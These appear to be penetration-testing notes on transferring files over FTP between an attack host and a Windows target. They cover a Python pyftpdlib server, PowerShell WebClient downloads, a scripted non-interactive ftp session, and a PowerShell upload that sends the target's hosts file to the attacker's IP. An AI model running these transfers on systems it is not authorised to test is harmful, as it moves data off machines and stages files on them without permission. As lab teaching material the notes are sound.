### Configuring FTP

We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module.
```sh
sudo pip3 install pyftpdlib

sudo python3 -m pyftpdlib --port 21
```

### Transferring Files from an FTP Server Using PowerShell.

```powershell
(powershell-session
New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### Transferring Files from an FTP Server without an Interactive Shell.

```sh
echo open 192.168.1.1 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.txt >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
ftp> open 192.168.1.1
ftp> USER anonymous
ftp> GET file.txt
ftp> bye
```

### Uploads using FTP

```sh
sudo python3 -m pyftpdlib --port 21 --write
```

### Uploading using Powershell

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

